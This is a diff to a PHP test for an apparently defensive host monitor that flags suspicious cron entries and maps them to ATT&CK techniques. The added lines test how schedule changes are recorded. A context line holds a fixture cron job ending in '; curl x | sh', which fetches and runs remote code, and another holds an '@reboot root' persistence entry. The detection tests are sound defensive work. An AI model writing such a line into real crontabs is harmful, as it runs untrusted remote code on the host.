@@ -6514,6 +6514,11 @@ function testWatchmanHost(): void
         watchmanOfficeCronLine('0 3 * * * ' . officeJobCommand('backup') . '; curl x | sh'),
         watchmanOfficeCronLine('0 3 * * * bash /tmp/job.sh backup > /dev/null 2>&1'),
         watchmanOfficeCronLine('@reboot root ' . officeJobCommand('backup'))]);
+    $book = [watchmanEntry('cron_file', 'cron_file:x/x.cron', $now - 60, ['lines' => 1])];
+    watchmanOfficeNoteSchedule($book, 'x/x.cron', $now, ['lines' => 1, 'office' => true]);
+    watchmanOfficeNoteSchedule($book, 'x/x.cron', $now + 60, ['lines' => 1, 'office' => true]);
+    same('office cron: an open entry about the file is closed as the line, a later change is a line of its own', [2, ['schedule', 'schedule'], [false, false]],
+        [count($book), array_column($book, 'by'), array_map('watchmanOpen', $book)]);
     same('attack: every kind has its technique, in ATT&CK\'s shape', [[], []],
         [array_values(array_diff(array_keys(WATCH_KINDS), array_keys(WATCH_ATTACK))),
          array_values(array_filter(WATCH_ATTACK, fn ($t) => !preg_match('/^T\d{4}(\.\d{3})?$/D', $t)))]);
